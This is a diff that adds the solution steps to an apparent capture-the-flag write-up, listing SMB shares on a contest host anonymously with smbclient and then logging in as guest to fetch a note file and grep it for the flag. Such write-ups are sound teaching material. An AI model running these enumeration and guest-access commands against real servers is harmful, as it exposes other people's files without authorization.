@@ -12,6 +12,17 @@ By Robert Hill (@Rob H on discord)
 #### Solution:
 
 ```bash
+smbclient -L betta.utctf.live -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        WorkShares      Disk      Sharing of work files
+        BackUps         Disk      File Backups.
+        IPC$            IPC       IPC Service (Samba Server)
+SMB1 disabled -- no workgroup available
+
+smbclient //betta.utctf.live/WorkShares/ -U guest% -c "get shares\IT\Itstuff\notetoIT"
+cat shares\\IT\\Itstuff\\notetoIT | grep utflag
 ```
 
 ---
